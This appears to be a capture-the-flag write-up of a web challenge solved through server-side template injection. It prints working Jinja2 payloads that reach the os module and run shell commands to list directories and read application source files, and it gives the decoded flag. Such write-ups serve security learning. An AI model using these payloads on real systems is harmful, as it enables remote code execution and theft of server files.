Challenge: Injection
<br>
Points: 200
<br>
Category: Web
<br>
Objective: Go to the given URL and get the flag
<br><br>
Process of find the flag: So when I opened up the URL I saw a basic login form, I thought we need to use SQL injection to exploit it, I tried a lot of SQL injections but none of them worked, then I thought maybe XSS injections would work so I tried a lot of XSS injections, this all took me around 1.5 hours to two hours and the result was nothing I did not make any progress at all.
<br><br>
So after a few hours of rest and a couple of challenges later I came back to it, because one of my friends gave me a hint that its related to Server Side Template Injection(SSTI), so I quickly watched a few YouTube videos to understand how SSTI works.
<br><br>
After watching the videos I googled ‘SSTI payload cheatsheet’ and found a lot of resources full of SSTI payloads, then I tried all of them in the input field and none of them worked at all, then later on I got to know that I need to add those payloads at the end of the URL and not in the input fields, so I quickly tried a few basic payloads and they seem to be working, so now I just had to find the correct payload.
<br><br>
I found this payload 
```

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

```
<br>
What this does is, it imports OS module, and allows us to use OS commands, so when we use ls command we get this 
<br><br> 
<img src='https://github.com/thirty2/CTF-Writeups/blob/master/2021/dCTF/web/Injection/content.png'>
<br>

So no we needed to check all the other folders and the app.py file.
I did check app.py by 
```

{{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}

```
But I didn’t get the result that I wanted.

So I tried to list all the items in the lib directory, and this could be done by 
```

{{config.__class__.__init__.__globals__['os'].popen('ls /app/lib').read()}}

```
This directory had a file named as security.py
<br><br>
![post_request](https://github.com/thirty2/CTF-Writeups/blob/master/2021/dCTF/web/Injection/request.png)
<br>
So now I had to check what was inside security.py
```
{{config.__class__.__init__.__globals__['os'].popen('cat /app/lib/security.py').read()}}
```
I found something really helpful.
<br><br>
![result](https://github.com/thirty2/CTF-Writeups/blob/master/2021/dCTF/web/Injection/request.png)
<br>
This is the flag, but its encrypted, so now I just had to decrypt it.
<br>
I couldn’t decrypt it due to my bad cryptography skills, so my teammate did it.
To decrypt it you just had to flip the string backwords and then decrypt it using base64.
This is the reversed string
<br><br>
![decrypted_result](https://github.com/thirty2/CTF-Writeups/blob/master/2021/dCTF/web/Injection/decrypted%20result.png)
<br>
The flag: dctf{4ll_us3r_1nput_1s_3v1l}
<br><br><br>
The tool that I used in this challenge is Postman(https://www.postman.com/)
